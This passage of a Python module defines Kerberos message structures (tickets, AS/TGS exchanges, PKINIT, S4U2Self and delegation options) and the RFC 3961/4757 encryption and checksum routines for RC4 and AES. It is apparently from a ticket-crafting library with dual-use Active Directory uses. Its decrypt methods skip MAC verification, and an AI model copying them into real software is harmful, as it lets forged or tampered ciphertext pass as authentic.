class PA_PAC_REQUEST(univ.Sequence):
	componentType = namedtype.NamedTypes (
		namedtype.NamedType('include-pac', univ.Boolean().subtype(explicitTag = tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 0)))
	)

### PADATA: Basic authentication 2nd: PA-ENC-TIMESTAMP ###

class PA_ENC_TS_ENC(univ.Sequence):
	componentType = namedtype.NamedTypes (
		_sequence_component ('patimestamp', 0, KerberosTime()),
		_sequence_optional_component ('pausec', 1, Microseconds())
	)

### PADATA: PKINIT authentication: PA-PK-AS-REQ ###

# KerberosV5Spec2 DEFINITIONS EXPLICIT TAGS ::=
TAG = 'explicit'

class DHNonce(core.OctetString):
	pass

class AlgorithmIdentifiers(core.SequenceOf):
	_child_spec = algos.AlgorithmIdentifier

class PKAuthenticator(core.Sequence):
	_fields = [
		('cusec', core.Integer, {'tag_type': TAG, 'tag': 0}), 
		('ctime', KerberosTimeCore, {'tag_type': TAG, 'tag': 1}),
		('nonce', core.Integer, {'tag_type': TAG, 'tag': 2}),
		('paChecksum', core.OctetString, {'tag_type': TAG, 'tag': 3, 'optional': True}),
	]

SubjectPublicKeyInfo = keys.PublicKeyInfo

class AuthPack(core.Sequence):
	_fields = [
		('pkAuthenticator', PKAuthenticator, {'tag_type': TAG, 'tag': 0}), 
		('clientPublicValue', SubjectPublicKeyInfo, {'tag_type': TAG, 'tag': 1, 'optional' : True}),
		('supportedCMSTypes', AlgorithmIdentifiers, {'tag_type': TAG, 'tag': 2, 'optional' : True}), 
		('clientDHNonce', DHNonce, {'tag_type': TAG, 'tag': 3, 'optional' : True}), 
	]

class ExternalPrincipalIdentifier(univ.Sequence):
    componentType = namedtype.NamedTypes(
        _sequence_optional_component_implicit('subjectName', 0, univ.OctetString()),
        _sequence_optional_component_implicit('issuerAndSerialNumber', 1, univ.OctetString()),
        _sequence_optional_component_implicit('subjectKeyIdentifier', 2, univ.OctetString())
    )

class ExternalPrincipalIdentifiers(univ.SequenceOf):
    componentType = ExternalPrincipalIdentifier

class PA_PK_AS_REQ(univ.Sequence):
    componentType = namedtype.NamedTypes(
        _sequence_component_implicit('signedAuthPack', 0, univ.OctetString()),
		_sequence_optional_component('trustedCertifiers', 1, ExternalPrincipalIdentifiers()),
        _sequence_optional_component_implicit('kdcPkId', 2, univ.OctetString())
    )

### Encrypted data: Authorization data encrypted ###

class EncryptedData(univ.Sequence):
	componentType = namedtype.NamedTypes (
		_sequence_component("etype", 0, Int32()),
		_sequence_optional_component("kvno", 1, UInt32()),
		_sequence_component("cipher", 2, univ.OctetString())
		)

### Additional tickets which contain TicketPart encrypted ###

class EncTicketPart (univ.Sequence):
	tagSet = _application_tag (3)
	componentType = namedtype.NamedTypes (
		_sequence_component ("flags", 0, TicketFlags()),
		_sequence_component ("key", 1, EncryptionKey()),
		_sequence_component ("crealm", 2, Realm()),
		_sequence_component ("cname", 3, PrincipalName()),
		_sequence_component ("transited", 4, TransitedEncoding()),
		_sequence_component ("authtime", 5, KerberosTime()),
		_sequence_optional_component ("starttime", 6, KerberosTime()),
		_sequence_component ("endtime", 7, KerberosTime()),
		_sequence_optional_component ("renew-till", 8, KerberosTime()),
		_sequence_optional_component ("caddr", 9, HostAddresses()),
		_sequence_optional_component ("authorization-data", 10, AuthorizationData())
		)

class Ticket(univ.Sequence):
	tagSet = _application_tag(ApplicationTagNumbers.Ticket.value)
	componentType = namedtype.NamedTypes (
		_vno_component(name = "tkt-vno", tag_value = 0),
		_sequence_component("realm", 1, Realm()),
		_sequence_component("sname", 2, PrincipalName()),
		_sequence_component("enc-part", 3, EncryptedData())
		)

### AS-REQ ###

class KDCOptionsVals(Enum):
	reserved                = 0
	forwardable             = 1
	forwarded               = 2
	proxiable               = 3
	proxy                   = 4
	allow_postdate          = 5
	postdated               = 6
	unused7                 = 7
	renewable               = 8
	unused9                 = 9
	unused10                = 10
	opt_hardware_auth       = 11
	unused12                = 12
	unused13                = 13
	cname_in_addl_tkt       = 14
	canonicalize            = 15
	disable_transited_check = 26
	renewable_ok            = 27
	enc_tkt_in_skey         = 28
	renew                   = 30
	validate                = 31

class KDCOptions(KerberosFlags):
	pass

class KDC_REQ_BODY(univ.Sequence):
	componentType = namedtype.NamedTypes (
		_sequence_component('kdc-options', 0, KDCOptions()),
		_sequence_optional_component('cname', 1, PrincipalName()),
		_sequence_component('realm', 2, Realm()),
		_sequence_optional_component('sname', 3, PrincipalName()),
		_sequence_optional_component('from', 4, KerberosTime()),
		_sequence_component('till', 5, KerberosTime()),
		_sequence_optional_component('rtime', 6, KerberosTime()),
		_sequence_component('nonce', 7, UInt32()),
		_sequence_component('etype', 8, univ.SequenceOf(componentType = Int32())),
		_sequence_optional_component('addresses', 9, HostAddresses()),
		_sequence_optional_component('enc-authorization-data', 10, EncryptedData()),
		_sequence_optional_component('additional-tickets', 11, univ.SequenceOf(componentType = Ticket()))
		)

class KDC_REQ(univ.Sequence):
	componentType = namedtype.NamedTypes (
		_vno_component(1),
		_msg_type_component(2, (ApplicationTagNumbers.AS_REQ.value, ApplicationTagNumbers.TGS_REQ.value)),
		_sequence_optional_component('padata', 3, univ.SequenceOf(componentType = PA_DATA())),
		_sequence_component('req-body', 4, KDC_REQ_BODY())
		)

class AS_REQ(KDC_REQ):
	tagSet = _application_tag(ApplicationTagNumbers.AS_REQ.value)

##############
### AS-REP ###
##############

### PADATA: Basic authentication: PA-ETYPE-INFO(2) ###

class ETYPE_INFO_ENTRY(univ.Sequence):
	componentType = namedtype.NamedTypes(
		_sequence_component('etype', 0, Int32()),
		_sequence_optional_component('salt', 1, univ.OctetString()))

class ETYPE_INFO(univ.SequenceOf):
	componentType = ETYPE_INFO_ENTRY()

class ETYPE_INFO2_ENTRY(univ.Sequence):
	componentType = namedtype.NamedTypes(
		_sequence_component('etype', 0, Int32()),
		_sequence_optional_component('salt', 1, KerberosString()),
		_sequence_optional_component('s2kparams', 2, univ.OctetString()))

class ETYPE_INFO2(univ.SequenceOf):
	componentType = ETYPE_INFO2_ENTRY()

### PADATA: PKINIT authentication: PA_PK_AS_REP ###

UNIVERSAL = 0
APPLICATION = 1
CONTEXT = 2

class DHRepInfo(core.Sequence):
	_fields = [
		('dhSignedData', core.OctetString, {'tag_type': 'implicit', 'tag': 0}),
		('serverDHNonce', DHNonce, {'tag_type': TAG, 'tag': 1, 'optional': True}),
	]

class KDCDHKeyInfo(core.Sequence):
	_fields = [
		('subjectPublicKey', core.BitString, {'tag_type': TAG, 'tag': 0}),
		('nonce', core.Integer, {'tag_type': TAG, 'tag': 1}),
		('dhKeyExpiration', KerberosTimeCore, {'tag_type': TAG, 'tag': 2, 'optional': True}),
	]

class PA_PK_AS_REP (core.Choice):
	_alternatives = [
		('dhInfo', DHRepInfo, {'explicit': (CONTEXT, 0) }  ),
		('encKeyPack', core.OctetString, {'implicit': (CONTEXT, 1) }  ),
	]

### Encrypted data: TicketPart encrypted OR ASRepPart encrypted ###

class EncryptedData(univ.Sequence):
	componentType = namedtype.NamedTypes (
		_sequence_component("etype", 0, Int32()),
		_sequence_optional_component("kvno", 1, UInt32()),
		_sequence_component("cipher", 2, univ.OctetString())
		)

### TGT which contain TicketPart encrypted ###

class EncTicketPart (univ.Sequence):
	tagSet = _application_tag (3)
	componentType = namedtype.NamedTypes (
		_sequence_component ("flags", 0, TicketFlags()),
		_sequence_component ("key", 1, EncryptionKey()),
		_sequence_component ("crealm", 2, Realm()),
		_sequence_component ("cname", 3, PrincipalName()),
		_sequence_component ("transited", 4, TransitedEncoding()),
		_sequence_component ("authtime", 5, KerberosTime()),
		_sequence_optional_component ("starttime", 6, KerberosTime()),
		_sequence_component ("endtime", 7, KerberosTime()),
		_sequence_optional_component ("renew-till", 8, KerberosTime()),
		_sequence_optional_component ("caddr", 9, HostAddresses()),
		_sequence_optional_component ("authorization-data", 10, AuthorizationData())
		)

class Ticket(univ.Sequence):
	tagSet = _application_tag(ApplicationTagNumbers.Ticket.value)
	componentType = namedtype.NamedTypes (
		_vno_component(name = "tkt-vno", tag_value = 0),
		_sequence_component("realm", 1, Realm()),
		_sequence_component("sname", 2, PrincipalName()),
		_sequence_component("enc-part", 3, EncryptedData())
		)

### ASRepPart encrypted ###

class EncKDCRepPart (univ.Sequence):
	componentType = namedtype.NamedTypes (
		_sequence_component ('key', 0, EncryptionKey()),
		_sequence_component ('last-req', 1, LastReq()),
		_sequence_component ('nonce', 2, UInt32()),
		_sequence_optional_component ('key-expiration', 3, KerberosTime()),
		_sequence_component ('flags', 4, TicketFlags()),
		_sequence_component ('authtime', 5, KerberosTime()),
		_sequence_optional_component ('starttime', 6, KerberosTime()),
		_sequence_component ('endtime', 7, KerberosTime()),
		_sequence_optional_component ('renew-till', 8, KerberosTime()),
		_sequence_component ('srealm', 9, Realm()),
		_sequence_component ('sname', 10, PrincipalName()),
		_sequence_optional_component ('caddr', 11, HostAddresses()),
		_sequence_optional_component ('encrypted_pa_data', 12, METHOD_DATA())
		)

class EncASRepPart (EncKDCRepPart):
	tagSet = _application_tag (25)

### ASRep ###

class KDC_REP(univ.Sequence):
	componentType = namedtype.NamedTypes (
		_vno_component(0),
		_msg_type_component(1, (ApplicationTagNumbers.AS_REP.value, ApplicationTagNumbers.TGS_REP.value)),
		_sequence_optional_component('padata', 2, univ.SequenceOf(componentType = PA_DATA())),
		_sequence_component('crealm', 3, Realm()),
		_sequence_component('cname', 4, PrincipalName()),
		_sequence_component('ticket', 5, Ticket()),
		_sequence_component('enc-part', 6, EncryptedData())
		)

class AS_REP(KDC_REP):
	tagSet = _application_tag(ApplicationTagNumbers.AS_REP.value)
 
###############
### TGS-REQ ###
###############

### Basic request: PA-TGS-REQ ###

class APOptionsVals(Enum):
    reserved        = 0
    use_session_key = 1
    mutual_required = 2

class APOptions(KerberosFlags):
	pass

class AP_REQ (univ.Sequence):
	tagSet = _application_tag (ApplicationTagNumbers.AP_REQ.value)
	componentType = namedtype.NamedTypes (
		_vno_component(0),
		_msg_type_component(1, (ApplicationTagNumbers.AP_REQ.value,)),
		_sequence_component('ap-options', 2, APOptions()),
		_sequence_component('ticket', 3, Ticket()),
		_sequence_component('authenticator', 4, EncryptedData())
		)

### S4U2Self request: PA-FOR-USER ###

class PA_FOR_USER_ENC (univ.Sequence):
	componentType = namedtype.NamedTypes (
		_sequence_component ('userName', 0, PrincipalName()),
		_sequence_optional_component ('userRealm', 1, Realm()),
		_sequence_optional_component ('cksum', 2, Checksum()),
		_sequence_optional_component ('auth-package', 3, KerberosString())
		)

### Encrypted data: Authorization data encrypted ###

class EncryptedData (univ.Sequence):
	componentType = namedtype.NamedTypes (
		_sequence_component("etype", 0, Int32()),
		_sequence_optional_component("kvno", 1, UInt32()),
		_sequence_component("cipher", 2, univ.OctetString())
		)

### Additional tickets which contain TicketPart encrypted ###

class EncTicketPart (univ.Sequence):
	tagSet = _application_tag (3)
	componentType = namedtype.NamedTypes (
		_sequence_component ("flags", 0, TicketFlags()),
		_sequence_component ("key", 1, EncryptionKey()),
		_sequence_component ("crealm", 2, Realm()),
		_sequence_component ("cname", 3, PrincipalName()),
		_sequence_component ("transited", 4, TransitedEncoding()),
		_sequence_component ("authtime", 5, KerberosTime()),
		_sequence_optional_component ("starttime", 6, KerberosTime()),
		_sequence_component ("endtime", 7, KerberosTime()),
		_sequence_optional_component ("renew-till", 8, KerberosTime()),
		_sequence_optional_component ("caddr", 9, HostAddresses()),
		_sequence_optional_component ("authorization-data", 10, AuthorizationData())
		)

class Ticket (univ.Sequence):
	tagSet = _application_tag (ApplicationTagNumbers.Ticket.value)
	componentType = namedtype.NamedTypes (
		_vno_component(name = "tkt-vno", tag_value = 0),
		_sequence_component("realm", 1, Realm()),
		_sequence_component("sname", 2, PrincipalName()),
		_sequence_component("enc-part", 3, EncryptedData())
		)

### TGS-REQ ###

class PAPacOptions(Enum):
	# [MS-KILE] 2.2.10
	claims                                = 0
	branch_aware                          = 1
	forward_to_full_dc                    = 2
	# [MS-SFU] 2.2.5
	resource_based_constrained_delegation = 3

class KDCOptionsVals(Enum):
	reserved                = 0
	forwardable             = 1
	forwarded               = 2
	proxiable               = 3
	proxy                   = 4
	allow_postdate          = 5
	postdated               = 6
	unused7                 = 7
	renewable               = 8
	unused9                 = 9
	unused10                = 10
	opt_hardware_auth       = 11
	unused12                = 12
	unused13                = 13
	cname_in_addl_tkt       = 14
	canonicalize            = 15
	disable_transited_check = 26
	renewable_ok            = 27
	enc_tkt_in_skey         = 28
	renew                   = 30
	validate                = 31

class KDCOptions(KerberosFlags):
	pass

class KDC_REQ_BODY(univ.Sequence):
	componentType = namedtype.NamedTypes (
		_sequence_component('kdc-options', 0, KDCOptions()),
		_sequence_optional_component('cname', 1, PrincipalName()),
		_sequence_component('realm', 2, Realm()),
		_sequence_optional_component('sname', 3, PrincipalName()),
		_sequence_optional_component('from', 4, KerberosTime()),
		_sequence_component('till', 5, KerberosTime()),
		_sequence_optional_component('rtime', 6, KerberosTime()),
		_sequence_component('nonce', 7, UInt32()),
		_sequence_component('etype', 8, univ.SequenceOf(componentType = Int32())),
		_sequence_optional_component('addresses', 9, HostAddresses()),
		_sequence_optional_component('enc-authorization-data', 10, EncryptedData()),
		_sequence_optional_component('additional-tickets', 11, univ.SequenceOf(componentType = Ticket()))
		)

class KDC_REQ(univ.Sequence):
	componentType = namedtype.NamedTypes (
		_vno_component(1),
		_msg_type_component(2, (ApplicationTagNumbers.AS_REQ.value, ApplicationTagNumbers.TGS_REQ.value)),
		_sequence_optional_component('padata', 3, univ.SequenceOf(componentType = PA_DATA())),
		_sequence_component('req-body', 4, KDC_REQ_BODY())
		)

class TGS_REQ(KDC_REQ):
	tagSet = _application_tag(ApplicationTagNumbers.TGS_REQ.value)

###############
### TGS-REP ###
###############

### Encrypted data: TicketPart encrypted OR TGSRepPart encrypted ###

class EncryptedData(univ.Sequence):
	componentType = namedtype.NamedTypes (
		_sequence_component("etype", 0, Int32()),
		_sequence_optional_component("kvno", 1, UInt32()),
		_sequence_component("cipher", 2, univ.OctetString())
		)

### ST which contain TicketPart encrypted ###

class Ticket(univ.Sequence):
	tagSet = _application_tag(ApplicationTagNumbers.Ticket.value)
	componentType = namedtype.NamedTypes(
		_vno_component(name = "tkt-vno", tag_value = 0),
		_sequence_component("realm", 1, Realm()),
		_sequence_component("sname", 2, PrincipalName()),
		_sequence_component("enc-part", 3, EncryptedData())
		)

class EncTicketPart (univ.Sequence):
	tagSet = _application_tag (3)
	componentType = namedtype.NamedTypes (
		_sequence_component ("flags", 0, TicketFlags()),
		_sequence_component ("key", 1, EncryptionKey()),
		_sequence_component ("crealm", 2, Realm()),
		_sequence_component ("cname", 3, PrincipalName()),
		_sequence_component ("transited", 4, TransitedEncoding()),
		_sequence_component ("authtime", 5, KerberosTime()),
		_sequence_optional_component ("starttime", 6, KerberosTime()),
		_sequence_component ("endtime", 7, KerberosTime()),
		_sequence_optional_component ("renew-till", 8, KerberosTime()),
		_sequence_optional_component ("caddr", 9, HostAddresses()),
		_sequence_optional_component ("authorization-data", 10, AuthorizationData())
		)

### TGSRepPart encrypted ###

class EncKDCRepPart (univ.Sequence):
	componentType = namedtype.NamedTypes (
		_sequence_component ('key', 0, EncryptionKey()),
		_sequence_component ('last-req', 1, LastReq()),
		_sequence_component ('nonce', 2, UInt32()),
		_sequence_optional_component ('key-expiration', 3, KerberosTime()),
		_sequence_component ('flags', 4, TicketFlags()),
		_sequence_component ('authtime', 5, KerberosTime()),
		_sequence_optional_component ('starttime', 6, KerberosTime()),
		_sequence_component ('endtime', 7, KerberosTime()),
		_sequence_optional_component ('renew-till', 8, KerberosTime()),
		_sequence_component ('srealm', 9, Realm()),
		_sequence_component ('sname', 10, PrincipalName()),
		_sequence_optional_component ('caddr', 11, HostAddresses()),
		_sequence_optional_component ('encrypted_pa_data', 12, METHOD_DATA())
		)

class EncTGSRepPart (EncKDCRepPart):
	tagSet = _application_tag (26)

### TGSRep ###

class KDC_REP(univ.Sequence):
	componentType = namedtype.NamedTypes(
		_vno_component(0),
		_msg_type_component(1, (ApplicationTagNumbers.AS_REP.value, ApplicationTagNumbers.TGS_REP.value)),
		_sequence_optional_component('padata', 2, univ.SequenceOf(componentType = PA_DATA())),
		_sequence_component('crealm', 3, Realm()),
		_sequence_component('cname', 4, PrincipalName()),
		_sequence_component('ticket', 5, Ticket()),
		_sequence_component('enc-part', 6, EncryptedData())
		)

class TGS_REP(KDC_REP):
	tagSet = _application_tag(ApplicationTagNumbers.TGS_REP.value)

##############
### AP-REQ ###
##############

# Constants
GSS_C_DCE_STYLE     = 0x1000
GSS_C_DELEG_FLAG    = 1
GSS_C_MUTUAL_FLAG   = 2
GSS_C_REPLAY_FLAG   = 4
GSS_C_SEQUENCE_FLAG = 8
GSS_C_CONF_FLAG     = 0x10
GSS_C_INTEG_FLAG    = 0x20

class CheckSumField(Structure):
    structure = (
        ('Lgth','<L=16'),
        ('Bnd','16s=b""'),
        ('Flags','<L=0'),
    )

class APOptionsVals(Enum):
    reserved        = 0
    use_session_key = 1
    mutual_required = 2

class APOptions(KerberosFlags):
	pass

class AP_REQ(univ.Sequence):
    tagSet = _application_tag(ApplicationTagNumbers.AP_REQ.value)
    componentType = namedtype.NamedTypes(
        _vno_component(0),
        _msg_type_component(1, (ApplicationTagNumbers.AP_REQ.value,)),
        _sequence_component('ap-options', 2, APOptions()),
        _sequence_component('ticket', 3, Ticket()),
        _sequence_component('authenticator', 4, EncryptedData())
    )

##############
### AP-REP ###
##############

class AP_REP(univ.Sequence):
    tagSet = _application_tag(ApplicationTagNumbers.AP_REP.value)
    componentType = namedtype.NamedTypes(
        _vno_component(0),
        _msg_type_component(1, (ApplicationTagNumbers.AP_REP.value,)),
        _sequence_component('enc-part', 2, EncryptedData()),
    )

class EncAPRepPart(univ.Sequence):
    tagSet = _application_tag(ApplicationTagNumbers.EncApRepPart.value)
    componentType = namedtype.NamedTypes(
        _sequence_component('ctime', 0, KerberosTime()),
        _sequence_component('cusec', 1, Microseconds()),
        _sequence_optional_component('subkey', 2, EncryptionKey()),
        _sequence_optional_component('seq-number', 3, UInt32()),
    )

#################################################################
#                     Encryption/Decryption                     #
#################################################################

class EncryptionTypes (Enum):
	des_cbc_crc                  = 1
	des_cbc_md4                  = 2
	des_cbc_md5                  = 3
	_reserved_4                  = 4
	des3_cbc_md5                 = 5
	_reserved_6                  = 6
	des3_cbc_sha1                = 7
	dsaWithSHA1_CmsOID           = 9
	md5WithRSAEncryption_CmsOID  = 10
	sha1WithRSAEncryption_CmsOID = 11
	rc2CBC_EnvOID                = 12
	rsaEncryption_EnvOID         = 13
	rsaES_OAEP_ENV_OID           = 14
	des_ede3_cbc_Env_OID         = 15
	des3_cbc_sha1_kd             = 16
	aes128_cts_hmac_sha1_96      = 17
	aes256_cts_hmac_sha1_96      = 18
	rc4_hmac                     = 23
	rc4_hmac_exp                 = 24
	subkey_keymaterial           = 65
	rc4_hmac_old_exp             = -135

class Enctype(object):
	# DES_CRC = 1
	# DES_MD4 = 2
	# DES_MD5 = 3
	# DES3 = 16
	AES128 = 17
	AES256 = 18
	RC4 = 23

class Cksumtype(object):
    CRC32 = 1
    MD4 = 2
    MD4_DES = 3
    MD5 = 7
    MD5_DES = 8
    SHA1 = 9
    SHA1_DES3 = 12
    SHA1_AES128 = 15
    SHA1_AES256 = 16
    HMAC_MD5 = -138

def _nfold (ba, nbytes):
	# Convert bytearray to a string of length nbytes using the RFC 3961 nfold
	# operation.

	# Rotate the bytes in ba to the right by nbits bits.
	def rotate_right (ba, nbits):
		ba = bytearray (ba)
		nbytes, remain = (nbits // 8) % len (ba), nbits % 8
		return bytearray ((ba[i-nbytes] >> remain) | ((ba[i-nbytes-1] << (8 - remain)) & 0xff) for i in range (len (ba)))

	# Add equal-length strings together with end-around carry.
	def add_ones_complement (str1, str2):
		n = len (str1)
		v = [a + b for a, b in zip (str1, str2)]
		# Propagate carry bits to the left until there aren't any left.
		while any (x & ~0xff for x in v):
			v = [(v[i-n+1] >> 8) + (v[i] & 0xff) for i in range (n)]
		return bytearray (x for x in v)

	# Concatenate copies of str to produce the least common multiple
	# of len(str) and nbytes, rotating each copy of str to the right
	# by 13 bits times its list position.  Decompose the concatenation
	# into slices of length nbytes, and add them together as
	# big-endian ones' complement integers.
	slen = len (ba)
	lcm = nbytes * slen // gcd (nbytes, slen)
	bigstr = bytearray()
	for i in range (lcm // slen):
		bigstr += rotate_right (ba, 13 * i)
	slices = (bigstr[p:p+nbytes] for p in range (0, lcm, nbytes))
	return bytes (reduce (add_ones_complement, slices))

def _xorbytes (b1, b2):
	# xor two strings together and return the resulting string.
	assert len (b1) == len (b2)
	return bytearray ((x ^ y) for x, y in zip (b1, b2))

def basic_decrypt (key, ciphertext):
	assert len (ciphertext) >= 16
	aes = AES.new (key, AES.MODE_ECB)
	if len (ciphertext) == 16:
		return aes.decrypt (ciphertext)

	# Split the ciphertext into blocks.  The last block may be partial.
	cblocks = [bytearray (ciphertext[p:p+16]) for p in range (0, len (ciphertext), 16)]
	lastlen = len (cblocks[-1])
	# CBC-decrypt all but the last two blocks.
	prev_cblock = bytearray(16)
	plaintext = b''
	for bb in cblocks[:-2]:
		plaintext += _xorbytes (bytearray (aes.decrypt (bytes(bb))), prev_cblock)
		prev_cblock = bb
	# Decrypt the second-to-last cipher block.  The left side of
	# the decrypted block will be the final block of plaintext
	# xor'd with the final partial cipher block; the right side
	# will be the omitted bytes of ciphertext from the final
	# block.
	bb = bytearray (aes.decrypt (bytes (cblocks[-2])))
	lastplaintext = _xorbytes (bb[:lastlen], cblocks[-1])
	omitted = bb[lastlen:]
	# Decrypt the final cipher block plus the omitted bytes to get
	# the second-to-last plaintext block.
	plaintext += _xorbytes (bytearray (aes.decrypt (bytes (cblocks[-1]) + bytes (omitted))), prev_cblock)
	return plaintext + lastplaintext

def _zeropad (s, padsize):
	# Return s padded with 0 bytes to a multiple of padsize.
	padlen = (padsize - (len (s) % padsize)) % padsize
	return s + b'\0' * padlen

def basic_encrypt (key, plaintext):
		assert len (plaintext) >= 16
		aes = AES.new (key, AES.MODE_CBC, b'\0' * 16)
		ctext = aes.encrypt (_zeropad (bytes (plaintext), 16))
		if len (plaintext) > 16:
			# Swap the last two ciphertext blocks and truncate the
			# final block to match the plaintext length.
			lastlen = len (plaintext) % 16 or 16
			ctext = ctext[:-32] + ctext[-16:] + ctext[-32:-16][:lastlen]
		return ctext

def string_to_key (string, salt, params, seedsize, blocksize, enctype):
	(iterations,) = unpack ('>L', params or b'\x00\x00\x10\x00')
	prf = lambda p, s: HMAC.new (p, s, SHA).digest()
	seed = PBKDF2 (string, salt, seedsize, iterations, prf)
	plaintext = _nfold (b'kerberos', blocksize)
	rndseed = b''
	while len (rndseed) < seedsize:
		aes = AES.new (seed, AES.MODE_CBC, b'\0' * 16)
		ctext = aes.encrypt (_zeropad (bytes (plaintext), 16))
		if len (plaintext) > 16:
			# Swap the last two ciphertext blocks and truncate the
			# final block to match the plaintext length
			lastlen = len (plaintext) % 16 or 16
			ctext = ctext[:-32] + ctext[-16:] + ctext[-32:-16][:lastlen]
		rndseed += ctext
		plaintext = ctext
	return (binascii.hexlify (rndseed[0:seedsize])).decode ("utf8")

def derive (key, constant, seedsize, blocksize):
		# RFC 3961 only says to n-fold the constant only if it is
		# shorter than the cipher block size.  But all Unix
		# implementations n-fold constants if their length is larger
		# than the block size as well, and n-folding when the length
		# is equal to the block size is a no-op.
		plaintext = _nfold (constant, blocksize)
		rndseed = b''
		while len (rndseed) < seedsize:
			ciphertext = basic_encrypt (key, plaintext)
			rndseed += ciphertext
			plaintext = ciphertext
		return rndseed[0:seedsize]

def get_random_bytes(lenBytes):
	# We don't really need super strong randomness here to use PyCrypto.Random
	return urandom(lenBytes)

def _mac_equal(mac1, mac2):
    # Constant-time comparison function
	# Can't use HMAC.verify since we use truncated macs
    assert len(mac1) == len(mac2)
    res = 0
    for x, y in zip(mac1, mac2):
        res |= x ^ y
    return res == 0

class Cipher23:
	encType = Enctype.RC4
	keySize = 16
	seedSize = 16
	
	@classmethod
	def encrypt (cls, Key, KeyUsage, Confounder, ToEncrypt):
		# Return a four-byte string for an RFC 3961 keyusage, using
		# the RFC 4757 rules.  Per the errata, do not map 9 to 8.
		table = {3: 8, 23: 13}
		KeyUsage = table[KeyUsage] if KeyUsage in table else KeyUsage
		ki = HMAC.new (Key, pack ("<I", KeyUsage), MD5).digest()
		if Confounder is None:
			Confounder = get_random_bytes(8)
		cksum = HMAC.new (ki, Confounder + ToEncrypt, MD5).digest()
		ke = HMAC.new (ki, cksum, MD5).digest()
		cipherField = cksum + (ARC4.new (ke)).encrypt (bytes (Confounder + ToEncrypt))
		return cipherField

	@classmethod
	def decrypt (cls, Key, KeyUsage, ToDecrypt):
		# Return a four-byte string for an RFC 3961 keyusage, using
		# the RFC 4757 rules.  Per the errata, do not map 9 to 8.
		table = {3: 8, 23: 13}
		KeyUsage = table[KeyUsage] if KeyUsage in table else KeyUsage
		cksum, basic_ctext = bytearray (ToDecrypt[:16]), bytearray (ToDecrypt[16:])
		ki = HMAC.new (Key, pack ('<I', KeyUsage), MD5).digest()
		ke = HMAC.new (ki, cksum, MD5).digest()
		basic_plaintext = bytearray (ARC4.new (ke).decrypt (bytes (basic_ctext)))
		return (bytes (basic_plaintext[8:]), bytes (basic_plaintext[:8]))

class Cipher18:
	encType = Enctype.AES256
	keySize = 32
	seedSize = 32
	blockSize = 16
	
	@classmethod
	def encrypt (cls, Key, KeyUsage, Confounder, ToEncrypt):
		ki = derive (Key, pack ('>IB', KeyUsage, 0x55), 32, 16)
		ke = derive (Key, pack ('>IB', KeyUsage, 0xAA), 32, 16)
		if Confounder is None:
			Confounder = get_random_bytes(cls.blockSize)
		basic_plaintext = Confounder + _zeropad (ToEncrypt, 1)
		hmac = HMAC.new (ki, basic_plaintext, SHA1).digest()
		cipherField = basic_encrypt (ke, basic_plaintext) + hmac[:12]
		return cipherField

	@classmethod
	def decrypt (cls, Key, KeyUsage, ToDecrypt):
		ki = derive (Key, pack ('>IB', KeyUsage, 0x55), 32, 16)
		ke = derive (Key, pack ('>IB', KeyUsage, 0xAA), 32, 16)
		basic_ctext, mac = bytearray (ToDecrypt[:-12]), bytearray (ToDecrypt[-12:])
		basic_plaintext = basic_decrypt (ke, bytes (basic_ctext))
		return (bytes (basic_plaintext[16:]), bytes (basic_plaintext[:16]))

class Cipher17:
	encType = Enctype.AES128
	keySize = 16
	seedSize = 16
	blockSize = 16
	
	@classmethod
	def encrypt (cls, Key, KeyUsage, Confounder, ToEncrypt):
		ki = derive (Key, pack ('>IB', KeyUsage, 0x55), 16, 16)
		ke = derive (Key, pack ('>IB', KeyUsage, 0xAA), 16, 16)
		if Confounder is None:
			Confounder = get_random_bytes(cls.blockSize)
		basic_plaintext = Confounder + _zeropad (ToEncrypt, 1)
		hmac = HMAC.new (ki, basic_plaintext, SHA1).digest()
		cipherField = basic_encrypt (ke, basic_plaintext) + hmac[:12]
		return cipherField

	@classmethod
	def decrypt (cls, Key, KeyUsage, ToDecrypt):
		ki = derive (Key, pack ('>IB', KeyUsage, 0x55), 16, 16)
		ke = derive (Key, pack ('>IB', KeyUsage, 0xAA), 16, 16)
		basic_ctext, mac = bytearray (ToDecrypt[:-12]), bytearray (ToDecrypt[-12:])
		basic_plaintext = basic_decrypt (ke, bytes (basic_ctext))
		return (bytes (basic_plaintext[16:]), bytes (basic_plaintext[:16]))

class InvalidChecksum(ValueError):
    pass

class Cksum23:
	@classmethod
	def checksum(cls, Key, KeyUsage, text):
		# Return a four-byte string for an RFC 3961 keyusage, using
		# the RFC 4757 rules.  Per the errata, do not map 9 to 8.
		table = {3: 8, 23: 13}
		KeyUsage = table[KeyUsage] if KeyUsage in table else KeyUsage
		ksign = HMAC.new(Key, b'signaturekey\0', MD5).digest()
		md5hash = MD5.new(pack ("<I", KeyUsage) + text).digest()
		return HMAC.new(ksign, md5hash, MD5).digest()

	@classmethod
	def verify(cls, Key, KeyUsage, text, cksum):
		expected = cls.checksum(Key, KeyUsage, text)
		if not _mac_equal(bytearray(cksum), bytearray(expected)):
			raise InvalidChecksum('checksum verification failure')

class Cksum18:
	macSize = 12
	cipher = Cipher18

	@classmethod
	def checksum(cls, Key, KeyUsage, text):
		kc = derive(Key, pack('>IB', KeyUsage, 0x99), cls.cipher.seedSize, cls.cipher.blockSize)
		hmac = HMAC.new(kc, text, SHA).digest()
		return hmac[:cls.macSize]

	@classmethod
	def verify(cls, Key, KeyUsage, text, cksum):
		expected = cls.checksum(Key, KeyUsage, text)
		if not _mac_equal(bytearray(cksum), bytearray(expected)):
			raise InvalidChecksum('checksum verification failure')

class Cksum17:
	macSize = 12
	cipher = Cipher17

	@classmethod
	def checksum(cls, Key, KeyUsage, text):
		kc = derive(Key, pack('>IB', KeyUsage, 0x99), cls.cipher.seedSize, cls.cipher.blockSize)
		hmac = HMAC.new(kc, text, SHA).digest()
		return hmac[:cls.macSize]

	@classmethod
	def verify(cls, Key, KeyUsage, text, cksum):
		expected = cls.checksum(Key, KeyUsage, text)
		if not _mac_equal(bytearray(cksum), bytearray(expected)):
			raise InvalidChecksum('checksum verification failure')

ENCTYPE_TABLE = {
	# Enctype.DES_MD5: _DESCBC,
	# Enctype.DES3: _DES3CBC,
	Enctype.AES128: Cipher17,
	Enctype.AES256: Cipher18,
	Enctype.RC4: Cipher23
}

CHECKSUM_TABLE = {
    # Cksumtype.SHA1_DES3: _SHA1DES3,
    Cksumtype.SHA1_AES128: Cksum17,
    Cksumtype.SHA1_AES256: Cksum18,
    Cksumtype.HMAC_MD5: Cksum23,
    0xffffff76: Cksum23
}

#####################################################
#                     Functions                     #
#####################################################

####################
